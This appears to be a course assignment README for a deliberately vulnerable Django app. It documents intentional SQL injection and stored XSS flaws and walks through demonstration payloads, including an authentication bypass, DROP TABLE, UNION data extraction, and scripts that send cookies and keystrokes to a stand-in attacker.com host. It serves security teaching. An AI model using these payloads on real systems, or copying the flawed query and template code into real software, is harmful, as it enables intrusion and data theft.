# Communication_LTD - VULNERABLE VERSION

## ⚠️ WARNING: This is the VULNERABLE version with INTENTIONAL security flaws!

### DO NOT USE IN PRODUCTION!

This version contains intentional vulnerabilities for educational demonstration (Part B of assignment).

## Vulnerabilities Included

### 1. SQL Injection (SQLi)
- ❌ Login page - raw SQL with string concatenation
- ❌ Register page - raw SQL with string concatenation
- ❌ Dashboard - raw SQL for inserting clients

### 2. Stored Cross-Site Scripting (XSS)
- ❌ Dashboard - no input sanitization
- ❌ Template uses `| safe` filter on unsanitized data

## Quick Start

```bash
# 1. Install dependencies
pip install -r requirements.txt

# 2. Create database
python manage.py makemigrations
python manage.py migrate

# 3. Run server
python manage.py runserver

# 4. Open browser
http://127.0.0.1:8000/
```

## How to Demonstrate Vulnerabilities

### Demonstration 1: SQL Injection on Login

**Steps:**
1. Go to: `http://127.0.0.1:8000/`
2. In username field, enter:
   ```
   admin' OR '1'='1
   ```
3. In password field, enter anything
4. Click "Login"

**What happens:**
- SQL becomes: `SELECT ... WHERE username = 'admin' OR '1'='1'`
- `'1'='1'` is always true
- Returns all users / bypasses authentication
- May show error or unexpected behavior

**Why it's vulnerable:**
```python
# views.py line ~40
query = f"SELECT ... WHERE username = '{username}'"
cursor.execute(query)
# String concatenation - NO ESCAPING!
```

---

### Demonstration 2: SQL Injection on Register

**Steps:**
1. Go to: `http://127.0.0.1:8000/register/`
2. Username: `hacker' OR '1'='1' --`
3. Fill other fields normally
4. Try to register

**What happens:**
- SQL becomes: `SELECT COUNT(*) FROM users WHERE username = 'hacker' OR '1'='1' --'`
- Bypasses uniqueness check
- May allow duplicate usernames

**Vulnerable code:**
```python
# views.py line ~111
query = f"SELECT COUNT(*) FROM users WHERE username = '{username}' OR email = '{email}'"
cursor.execute(query)
```

---

### Demonstration 3: SQL Injection on Dashboard

**Steps:**
1. Register and login normally
2. In "Client Name" field, enter:
   ```
   ', '', ''); DROP TABLE Communication_LTD_client; --
   ```
3. Fill email and phone
4. Click "Add Client"

**What happens:**
- SQL becomes: `INSERT INTO clients VALUES ('', '', ''); DROP TABLE clients; --', ...)`
- Could execute malicious commands
- In SQLite, this particular attack may be blocked by default
- But shows the vulnerability exists

**Vulnerable code:**
```python
# views.py line ~174
query = f"INSERT INTO clients (name, email, phone) VALUES ('{client_name}', '{client_email}', '{client_phone}')"
cursor.execute(query)
```

---

### Demonstration 4: Stored XSS Attack

**Simple Alert:**

1. Login to dashboard
2. In "Client Name" field, enter:
   ```html
   <script>alert('XSS Attack!')</script>
   ```
3. Fill email and phone
4. Click "Add Client"
5. **Result:** Alert popup appears!
6. Refresh page - alert appears again (stored in database)

**Cookie Stealing (Demonstration):**

```html
<script>alert('Stolen cookies: ' + document.cookie)</script>
```

**Page Redirect:**

```html
<script>window.location='http://google.com'</script>
```

**Image with Error Handler:**

```html
<img src=x onerror="alert('XSS')">
```

**Why it's vulnerable:**

**views.py:**
```python
# NO sanitization
client_name = request.POST.get("client_name", "").strip()
# Saves raw HTML/JavaScript to database
```

**dashboard.html:**
```html
<!-- Uses | safe filter - doesn't escape HTML -->
<li>{{ c.name | safe }} — {{ c.email }} — {{ c.phone }}</li>
```

---

## Vulnerable Code Locations

| Vulnerability | File | Lines | Description |
|--------------|------|-------|-------------|
| SQLi - Login | views.py | 40-42 | Raw SQL query with f-string |
| SQLi - Register | views.py | 111-113 | Raw SQL for checking duplicates |
| SQLi - Dashboard | views.py | 174-176 | Raw SQL for inserting clients |
| XSS - Input | views.py | 163 | No sanitization of client_name |
| XSS - Output | templates/dashboard.html | 54 | `\| safe` filter on unsanitized data |

## Attack Impact Examples

### SQL Injection Impact

**Data Breach:**
```sql
Username: ' UNION SELECT password_hash, salt, email FROM users --
```
- Could leak all passwords and salts

**Authentication Bypass:**
```sql
Username: admin' --
Password: (anything)
```
- Comment out password check

**Data Modification:**
```sql
Client Name: '; UPDATE users SET is_locked = 1; --
```
- Lock all user accounts

### XSS Impact

**Session Hijacking:**
```html
<script>
fetch('http://attacker.com?session=' + document.cookie)
</script>
```
- Steals session cookies

**Phishing:**
```html
<script>
document.body.innerHTML = '<form action="http://attacker.com">Login: <input name="pass"></form>'
</script>
```
- Creates fake login form

**Keylogging:**
```html
<script>
document.addEventListener('keypress', function(e) {
  fetch('http://attacker.com?key=' + e.key)
})
</script>
```
- Sends every keystroke to attacker

---

## Testing Checklist

### SQL Injection Tests

- [ ] Login with: `admin' OR '1'='1`
- [ ] Register with: `test' OR '1'='1' --`
- [ ] Add client with: `test', '', ''); DROP TABLE clients; --`
- [ ] Take screenshots of each attempt
- [ ] Document what happened

### XSS Tests

- [ ] Client name: `<script>alert('XSS')</script>`
- [ ] Client name: `<img src=x onerror="alert('XSS')">`
- [ ] Client name: `<script>alert(document.cookie)</script>`
- [ ] Verify alert popup appears
- [ ] Verify alert persists after refresh (stored XSS)
- [ ] Take screenshots

---

## Comparison with Secure Version

| Feature | This Version (Vulnerable) | Secure Version |
|---------|--------------------------|----------------|
| Login Query | `f"SELECT ... WHERE username = '{x}'"` | `User.objects.get(username=x)` |
| SQL Type | Raw SQL, string concatenation | Django ORM, parameterized |
| XSS Protection | None | `escape()` function |
| Template | `{{ name \| safe }}` on raw data | `{{ name \| safe }}` on sanitized OR `{{ name }}` |

---

## For Submission

This is the **VULNERABLE version** for Part B of the assignment.

**Demonstrates:**
- ❌ SQL Injection vulnerabilities (Sections 1, 3, 4 from Part A)
- ❌ Stored XSS vulnerability (Section 4 from Part A)

**Compare with:**
- `../project_secure/` - Shows protections
- See `../COMPLETE_GUIDE_ENGLISH.md` for detailed explanations

**Required for Part B:**
1. ✅ Demonstrate Stored XSS on Section 4 (Dashboard)
2. ✅ Demonstrate SQLi on Section 1 (Register)
3. ✅ Demonstrate SQLi on Section 3 (Login)
4. ✅ Demonstrate SQLi on Section 4 (Dashboard)

---

## ⚠️ DISCLAIMER

**DO NOT deploy this version to production!**

This code contains intentional security vulnerabilities for educational purposes only. It demonstrates common web application security flaws and how they can be exploited.

**For educational use only.**

---

## Next Steps

1. Test all vulnerabilities in this version
2. Take screenshots of successful attacks
3. Switch to secure version: `../project_secure/`
4. Test same attacks - they should be blocked
5. Take screenshots of blocked attacks
6. Compare code side-by-side
7. Document differences

See `../COMPLETE_GUIDE_ENGLISH.md` for complete explanations.
